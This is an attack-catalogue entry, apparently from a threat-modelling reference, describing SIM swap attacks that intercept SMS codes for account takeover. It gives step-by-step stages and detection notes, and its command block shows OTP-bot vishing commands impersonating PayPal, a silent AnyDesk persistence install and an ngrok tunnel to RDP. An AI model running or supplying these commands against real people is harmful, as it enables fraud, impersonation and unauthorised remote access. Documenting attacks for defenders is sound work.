title: Telco SIM Swap Attack
description: Adversary hijacks a victim's mobile phone number to intercept SMS-based Multi-Factor Authentication (MFA) codes.
shortDescription: Hijacking phone numbers to bypass SMS MFA

metadata.descriptionHtml: The SIM Swap Attack (or SIM hijacking) is a technique where an attacker fraudulently transfers a victim's phone number to a SIM card under their control. This effectively decouples the victim's digital identity from their physical device.By controlling the phone number, the attacker can intercept SMS-based Two-Factor Authentication (2FA) codes and password reset links, granting them access to high-value accounts like banking, cryptocurrency exchanges, and enterprise Identity Providers (e.g., Okta, Microsoft Entra ID).Reconnaissance: Attacker purchases 'Fullz' (PII) to pass carrier security checks.Exploitation: Attacker contacts the carrier (social engineering) or uses an insider ('plug') to provision a new SIM.Network Update: The carrier's HLR/HSS database updates the routing, disconnecting the victim and connecting the attacker.Account Takeover: Attacker triggers password resets, intercepts the SMS OTP, and compromises the target account.
metadata.commandsBlock:
# Example: Using Telegram OTP Bot (SMSRanger) to socially engineer a code
# The bot calls the victim posing as 'PayPal Support'
/call 14155550199 paypal_suspicious_activity

# Example: BloodOTPbot usage to prime the victim via SMS first
/sms 14155550199 PayPalsender "We detected a login from Russia..."
/otp 14155550199 paypal

# Example: Installing persistence after access (AnyDesk)
$ AnyDesk.exe --install "C:\ProgramData\AnyDesk" --silent

# Example: Tunneling for C2 access
$ ngrok tcp 3389
prerequisites: Target account protected by SMS-based MFA
Blank SIM card compatible with victim's carrier
Insider contact ('plug') or social engineering script
attackerGains: Interception of all incoming SMS and voice calls
Ability to reset passwords via SMS recovery
detectionNotes: Sudden loss of cellular service ('No Service') on victim device
Password resets followed immediately by MFA method changes
Login attempts from anonymous IPs or unexpected locations
extraInfo: Scattered Spider / UNC3944 - Threat Group Profile

steps.name: Acquire Victim (PII)
steps.tooltip: Attacker loads victim PII (SSN, DOB, Address) into tools or prepares for vishing

steps.name: Social Engineering / Vishing
steps.tooltip: Attacker impersonates victim via phone/chat or bribes an insider ('plug') to initiate swap

steps.name: Provisioning Request
steps.tooltip: Support agent enters the new ICCID (SIM card ID) into the carrier's CRM system

steps.name: Update Location (HSS)
steps.tooltip: CRM pushes 'Update Location' or 'Change IMSI' command to the core network HLR/HSS

steps.name: De-register Device
steps.tooltip: Network detaches the victim's SIM. Victim device displays 'No Service'

steps.name: Register New SIM
steps.tooltip: Attacker's SIM card authenticates with the network and captures the phone number

steps.name: Trigger Password Reset
steps.tooltip: Attacker initiates 'Forgot Password' flow on target service (Okta, Gmail, Bank)

steps.name: Send SMS OTP
steps.tooltip: IdP sends SMS OTP to the phone number, which now routes to the Attacker

steps.name: Authenticate & Takeover

mitre.technique: Use Alternate Authentication Material: Web Session Cookie

steps.tooltip: Attacker enters the intercepted OTP and resets the password/MFA
